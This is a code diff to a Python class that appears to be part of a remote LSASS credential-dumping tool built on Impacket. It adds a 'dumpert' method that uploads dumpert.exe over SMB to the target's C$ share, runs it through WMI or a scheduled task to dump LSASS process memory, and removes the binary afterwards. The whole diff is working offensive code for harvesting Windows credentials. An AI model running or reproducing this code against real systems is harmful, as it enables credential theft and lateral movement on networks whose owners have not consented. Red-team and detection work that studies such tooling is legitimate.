@@ -20,7 +20,9 @@ class Dumper:
         self._tmp_dir = "\\Windows\\Temp\\"
         self._share = "C$"
         self._procdump = "procdump.exe"
+        self._dumpert = "dumpert.exe"
         self._procdump_path = args.procdump
+        self._dumpert_path = args.dumpert
         self._method = args.method
         self._timeout = args.timeout
 
@@ -33,9 +35,13 @@ class Dumper:
         self._conn = connection
         if args.procdump is not None:
             self._procdump_path = args.procdump
+        if args.dumpert is not None:
+            self._dumpert_path = args.dumpert
+            self._remote_lsass_dump = "dumpert.dmp"
 
         self.exec_methods = {"wmi": WMI, "task": TASK_EXEC}
         self.procdump = False
+        self.dumpert = False
 
     def dump(self):
         """
@@ -51,7 +57,7 @@ class Dumper:
 
         """
         A "methodology can be described in an array of 3 elements:
-        1. 1st element : Dump method to use (dll, procdump)
+        1. 1st element : Dump method to use (dll, procdump, dumpert)
         2. Shell context to use (powershell, cmd)
         3. List of remote execution methods (wmi, task)
         """
@@ -59,7 +65,8 @@ class Dumper:
             dump_methodologies = [
                 ["dll", "powershell", ("wmi", "task")],
                 ["dll", "cmd", ("task",)],
-                ["procdump", "cmd", ("wmi", "task")]
+                ["procdump", "cmd", ("wmi", "task")],
+                ["dumpert", "cmd", ("wmi", "task")]
             ]
         elif self._method == "1":
             dump_methodologies = [
@@ -78,8 +85,12 @@ class Dumper:
             dump_methodologies = [
                 ["dll", "cmd", ("task",)]
             ]
+        elif self._method == "5":
+            dump_methodologies = [
+                ["dumpert", "cmd", ("wmi", "task")]
+            ]
         else:
-            self._log.debug("Method \"{}\" is not supported (0-4). See -h for help".format(self._method))
+            self._log.debug("Method \"{}\" is not supported (0-5). See -h for help".format(self._method))
             return RetCode(ERROR_METHOD_NOT_SUPPORTED)
 
         ifile = ImpacketFile(self._conn, self._log)
@@ -90,6 +101,8 @@ class Dumper:
                 dumped = self.dll_dump(exec_methods, exec_shell)
             elif dump_method == "procdump":
                 dumped = self.procdump_dump(exec_methods)
+            elif dump_method == "dumpert":
+                dumped = self.dumpert_dump(exec_methods)
             else:
                 continue
 
@@ -189,6 +202,45 @@ class Dumper:
                     self._log.debug("Error : {}".format(str(e)))
             return RetCode(ERROR_WMI_NO_EXECUTE)
 
+    def dumpert_dump(self, exec_methods=("wmi", "task")):
+        """
+        Dump lsass with dumpert
+        :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
+        """
+        if not self._dumpert_path:
+            self._log.warning("dumpert path has not been provided")
+            return RetCode(ERROR_DUMPERT_NOT_PROVIDED)
+
+        # Upload dumpert
+        self._log.debug('Copy {} to {}'.format(self._dumpert_path, self._tmp_dir))
+        with open(self._dumpert_path, 'rb') as dumpert:
+            try:
+                self._conn.putFile(self._share, self._tmp_dir + self._dumpert, dumpert.read)
+            except Exception as e:
+                return RetCode(ERROR_DUMPERT_NOT_UPLOADED)
+        self.dumpert = True
+
+        # Dump lsass using PID
+        command = """cmd.exe /Q /c {}{} & if NOT EXIST {}{} (echo FAILED > {}{})""".format(
+            self._tmp_dir, self._dumpert,
+            self._tmp_dir, self._remote_lsass_dump,
+            self._tmp_dir, self._remote_lsass_dump
+        )
+        self._log.debug("Command : {}".format(command))
+
+        exec_completed = False
+        while not exec_completed:
+            for exec_method in exec_methods:
+                try:
+                    self._log.debug("Trying exec method : " + exec_method)
+                    self.exec_methods[exec_method](self._conn, self._log).execute(command)
+                    self._log.debug("Exec method \"{}\" success !".format(exec_method))
+                    return True
+                except Exception as e:
+                    self._log.warning("Exec method \"{}\" failed.".format(exec_method))
+                    self._log.debug("Error : {}".format(str(e)))
+            return RetCode(ERROR_WMI_NO_EXECUTE)
+
     def clean(self):
         try:
             self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
@@ -205,4 +257,13 @@ class Dumper:
                 self._log.success('Deleted procdump.exe')
             except Exception as e:
                 self._log.error('Error deleting procdump.exe')
+                self._log.debug("Error : {}".format(str(e)))
+
+        if self.dumpert:
+            # Delete dumpert.exe
+            try:
+                self._conn.deleteFile(self._share, self._tmp_dir + self._dumpert)
+                self._log.success('Deleted dumpert.exe')
+            except Exception as e:
+                self._log.error('Error deleting dumpert.exe')
                 self._log.debug("Error : {}".format(str(e)))
